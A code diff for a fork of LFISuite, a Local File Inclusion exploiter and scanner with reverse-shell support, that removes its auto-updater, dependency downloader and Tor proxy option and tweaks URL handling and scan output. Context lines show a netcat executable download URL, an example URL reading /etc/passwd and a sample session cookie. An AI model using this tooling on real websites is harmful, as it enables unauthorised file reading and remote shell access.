@@ -13,29 +13,6 @@ import sys
 import urllib.request, urllib.parse, urllib.error
 import subprocess
 
-def download(file_url,local_filename):
-    web_file = urllib.request.urlopen(file_url)
-    local_file = open(local_filename, 'w')
-    local_file.write(web_file.read())
-    web_file.close()
-    local_file.close()
-
-def solve_dependencies(module_name,download_url=None):
-    try:
-        from pipper import pip_install_module
-    except:
-        print("[!] pipper not found in the current directory.. Downloading pipper..")
-        download("https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/pipper.py","pipper.py")
-        from pipper import pip_install_module
-
-    if(download_url is not None):
-        print(("\n[*] Downloading %s from '%s'.." %(module_name,download_url) ))
-        download(download_url,module_name)
-        if(sys.platform[:3] == "win"): # in case you are using Windows you may need to install an additional module
-            pip_install_module("win_inet_pton")
-    else:
-        pip_install_module(module_name)
-
 import time
 import socket
 import codecs
@@ -43,29 +20,15 @@ import base64
 import urllib.request, urllib.parse, urllib.error
 import shutil
 
-try:
-    import requests
-except:
-    solve_dependencies("requests")
-    import requests
+import requests
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-try:
-    import socks
-except:
-    solve_dependencies("socks.py","https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/socks.py")
-    import socks
-
 import threading
 from random import randint
 
-try:
-    from termcolor import colored
-except:
-    solve_dependencies("termcolor")
-    from termcolor import colored
+from termcolor import colored
 
 netcat_url = "https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe"
 LFS_VERSION = '1.13' # DO NOT MODIFY THIS FOR ANY REASON!!
@@ -162,67 +125,9 @@ gen_headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Ge
 def banner():
 
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("""
-
-                         .//// *,                                 ,//// *,
-             .///////////*//** //            ,*. ,                ////* .                 .,, ..
-  ,*///* /.   *//////////. .,,../         ,*/////,.*         *///*  .,,.*/////////// * ,//////./,
-   .///* (,   *////    **.////,.(.       */////*,  *///* /. ./////*////,*//////////* */////*. ,#*
-    ///* (,   *///*       ////,,(.       *///////*.////* (, ,////*.////,.( *///*.%% *////////* (,
-   .###/ (,   */////////. ////.*(.      .. ,*//////*////./* *////*.////.*/ *///**(, /(((#####/ #,
-   ,###/ (,   (########/  #### (/.        . ,####( ,####(.,(####/ ,#### (* (###.(/. .#####/*.  #,
-   *###/..,/(*(###/   ** ,#### (/          /####/ * (###########  *#### (..###( #/. . *######/, *
-   /########/.####**#*/( *###( #*        *#####. %(,./#######(, # (###( # *###/ #*   ., .*####/.(.
-   /########/ ####,/(.   //,  (#*       ,*/((, ##/. .   ...  ,%#/ (/,  (#     /#/.      ,*  ,/./(.
-   .********, /*. .#/   .*##(/,.        ,/(###(*.     .,*****,.  ./##(/,. .,**,.           .*/(/,     v 1.13
-             ./#(/*.
-
-    """)
-
-    print("/*-------------------------------------------------------------------------*\\")
-    print("| Local File Inclusion Automatic Exploiter and Scanner + Reverse Shell      |")
-    print("|                                                                           |")
-    print("| Modules: AUTO-HACK, /self/environ, /self/fd, phpinfo, php://input,        |")
-    print("|          data://, expect://, php://filter, access logs                    |")
-    print("|                                                                           |")
-    print("| Author: D35m0nd142, <d35m0nd142@gmail.com> https://twitter.com/d35m0nd142 |")
-    print("\*-------------------------------------------------------------------------*/\n")
+    print("fork of lfisuite v1.13")
 
 
-def check_for_update():
-    lfisuite_github_url = "https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/lfisuite.py"
-    keyword = "LFS_VERSION = '"
-    updated = False
-    print("\n[*] Checking for LFISuite updates..")
-    time.sleep(1)
-
-    try:
-        lfisuite_content = requests.get(lfisuite_github_url,headers=gen_headers).text
-        currversion_index = SubstrFind(lfisuite_content,keyword)[0]
-        lfisuite_content = lfisuite_content[(currversion_index+len(keyword)):]
-
-        currversion = ""
-        for c in lfisuite_content:
-            if c == '\'':
-                break
-            currversion = "%s%s" %(currversion,c)
-
-        fcurrversion = float(currversion)
-        if(fcurrversion > float(LFS_VERSION)):
-            updated = True
-            print("[+] New LFISuite version found. Updating..")
-            download(lfisuite_github_url,sys.argv[0])
-            print((colored("\n[+] LFISuite updated to version %s" %currversion,"red")))
-            print("[i] Visit https://github.com/D35m0nd142/LFISuite/blob/master/CHANGELOG.md for details")
-            time.sleep(2)
-            os.system("%s %s" %(sys.executable,sys.argv[0]))
-        else:
-            print("[-] No updates available.\n")
-    except:
-        print("\n[-] Problem while updating.")
-
-    if updated:
-        sys.exit(0)
 
 # this is needed by access_log and passthru
 class NoURLEncodingSession(requests.Session):
@@ -320,8 +225,10 @@ def correctUrl(url): # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http
         return url
     eq = SubstrFind(url,"=")
     if(len(eq) == 0):
-        print("\n[ERROR] Invalid URL syntax!\n")
-        sys.exit()
+        print("\n[WARN] No equal in your URL?\n")
+        print(url)
+        return url
+
     last = eq[len(eq)-1]
 
     return url[:(last+1)]
@@ -1660,6 +1567,7 @@ def scanner():
             content = ""
 
         #content = r.content
+        content_length = len(content)
         if(status_code == 200):
             if ("[<a href='function.main'>function.main</a>" not in content
                 and "[<a href='function.include'>function.include</a>" not in content
@@ -1693,7 +1601,7 @@ def scanner():
                 else:
                     ahgen.append(website)
             else:
-                print("[-] '%s' [Not vulnerable]" %website)
+                print("[-] '%d' '%s' [Not vulnerable]" % (content_length, website))
         else:
             print("[!] Problem connecting to the website.\n")
 
@@ -1792,7 +1700,6 @@ def run_autoHack():
 #----------------------------------------------------------------------------------------------------------------------------------------#
 
 banner()
-check_for_update()
 time.sleep(0.5)
 choice = "4"
 validChoice = (choice == "1" or choice == "2" or choice == "x")
@@ -1813,22 +1720,6 @@ while(validChoice is False):
         if(len(input_cookie) > 0):
             gen_headers['Cookie'] = input_cookie
         #gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"
-
-        use_tor = input("\n[?] Do you want to enable TOR proxy ? (y/n) ")
-        if(use_tor == "y" or use_tor == "Y" or use_tor == "yes"):
-            tor_addr = input("[*] Tor IP [default='127.0.0.1'] -> ")
-            tor_port = input("[*] Tor Port [default=9150] -> ")
-            if(len(tor_addr) == 0):
-                tor_addr = "127.0.0.1"
-            if(tor_port.isdigit() is False or int(tor_port) > 65535 or int(tor_port) < 1):
-                print("[!] Invalid port! Using 9150.")
-                tor_port = 9150
-
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, tor_addr, int(tor_port))
-            socket.socket = socks.socksocket
-            print(colored("[+] TOR proxy active on socks5://%s:%s" %(tor_addr,tor_port),"red"))
-            time.sleep(0.5)
-
         if(choice == "2" or choice == "b"):
             scanner()
         elif(choice == "1" or choice == "a"):
